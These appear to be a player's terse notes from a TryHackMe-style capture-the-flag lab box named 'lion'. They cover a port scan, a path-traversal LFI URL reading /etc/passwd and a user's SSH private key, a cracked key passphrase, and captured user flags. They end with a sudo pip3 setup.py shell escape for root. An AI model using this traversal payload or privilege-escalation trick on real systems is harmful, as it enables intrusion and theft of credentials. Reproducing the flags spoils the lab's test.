# My IP : 10.8.226.18

# Target IP : 10.10.161.94


Open 10.10.161.94:80
Open 10.10.161.94:1337
Open 10.10.161.94:3306
Open 10.10.161.94:5555
Open 10.10.161.94:9999



lfi at :
http://10.10.161.94:5555/?page=./../../../../../../../../../../../../etc/passwd

alex:x:1000:1000:alex,,,:/home/alex:/bin/bash
marty:x:1001:1001:,,,:/home/marty:/bin/bash
gloria:x:1002:1002:,,,:/home/gloria:/bin/bash

http://10.10.161.94:5555/?page=./../../../../../../../../../../../../home/gloria/.ssh/id_rsa

id_rsa_gloria
dance            (id_rsa_gloria)

```bash
gloria@lion:~$ cat user.txt 
thm{05e2762150425df49a2d27e8bb08cf2d}

```


```bash
alex@lion:/home/alex$ cat user.txt 
guz{7732rs0312254rq6886oq84943q12s64}

rot 13
thm{7732ef0312254ed6886bd84943d12f64}

User alex may run the following commands on lion:
    (ALL) NOPASSWD: /usr/bin/pip3

TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py

sudo /usr/bin/pip3 install $TF
```